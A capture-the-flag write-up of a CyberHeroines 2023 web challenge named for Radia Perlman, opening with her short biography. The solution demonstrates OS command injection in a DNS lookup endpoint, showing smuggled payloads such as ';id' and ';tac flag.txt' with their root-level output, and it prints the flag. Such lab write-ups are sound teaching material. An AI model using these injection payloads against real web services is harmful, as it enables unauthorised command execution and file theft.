# Radia Perlman

## Radia Joy Perlman

[Radia Joy Perlman](https://en.wikipedia.org/wiki/Radia_Perlman)  (/ˈreɪdiə/;[1] born December 18, 1951) is an American computer programmer and network engineer. She is a major figure in assembling the networks and technology to enable what we now know as the internet. She is most famous for her invention of the spanning-tree protocol (STP), which is fundamental to the operation of network bridges, while working for Digital Equipment Corporation, thus earning her nickname "Mother of the Internet". Her innovations have made a huge impact on how networks self-organize and move data. She also made large contributions to many other areas of network design and standardization: for example, enabling today's link-state routing protocols, to be more robust, scalable, and easy to manage. -  [Wikipedia Entry](https://en.wikipedia.org/wiki/Radia_Perlman)

## Description

Chal: We thought we'd build a  [webapp](https://cyberheroines-web-srv3.chals.io/)  to help the  [Mother of the Internet](https://www.youtube.com/watch?v=5D1v42nw25E)  capture the flag.

Alternate (Better) Link:  [Webapp](http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6263/)

Author:  [Rusheel](https://github.com/Rusheelraj)

## Solution

![Radia-Perlman-1](/assets/ctf/cyberheroinesctf/radia-perlman-1.png)

Same as [Grace Hopper]({% post_url CTFs/CyberHeroinesCTF/2023/2023-09-10-Grace-Hopper %}), when we execute dns request we get: 

```
Command Output: Server: 127.0.0.11 
Address: 127.0.0.11#53 
Non-authoritative answer: 
Name: cyberheroines.ctfd.io 
Address: 165.227.251.182 
Name: cyberheroines.ctfd.io 
Address: 165.227.251.183
```

`Command Output` is interesting. What if dns quering isnt implemented by webapp, but is ran as command?

```
Payload: ;id
URL: https://cyberheroines-web-srv3.chals.io/dns?ip=;id
Command Output: uid=0(root) gid=0(root) groups=0(root)
```

```
Payload: ;ls -lah
URL: https://cyberheroines-web-srv3.chals.io/dns?ip=;ls+-lah # Space = "+" or %20 (URLEncoded)

Command Output: 
total 72K
drwxr-xr-x 1 root root 4.0K Aug 27 00:09 .
drwxr-xr-x 1 root root 4.0K Sep  9 12:49 ..
-rw-r--r-- 1 root root 8.1K Aug 27 00:08 .DS_Store
-rw-r--r-- 1 root root 1.4K Aug 25 17:11 code7.js
-rw-r--r-- 1 root root   41 Aug 25 21:38 flag.txt
drwxr-xr-x 1 root root 4.0K Aug 25 17:11 node_modules
-rw-r--r-- 1 root root  25K Aug 25 17:11 package-lock.json
-rw-r--r-- 1 root root  272 Aug 25 17:11 package.json
drwxr-xr-x 2 root root 4.0K Aug 26 23:34 public
drwxr-xr-x 2 root root 4.0K Aug 27 00:31 views
```

`cat flag.txt` didnt work, but `tac flag.txt` worked. [tac](https://man7.org/linux/man-pages/man1/tac.1.html)

```
Payload: ;id
URL: https://cyberheroines-web-srv3.chals.io/dns?ip=;tac+flag.txt; 

Command Output:
chctf{1_l0v3_5p4wn1n6_n0d3_ch1ld_pr0c355}
```
::: tip Flag
`chctf{1_l0v3_5p4wn1n6_n0d3_ch1ld_pr0c355}`
:::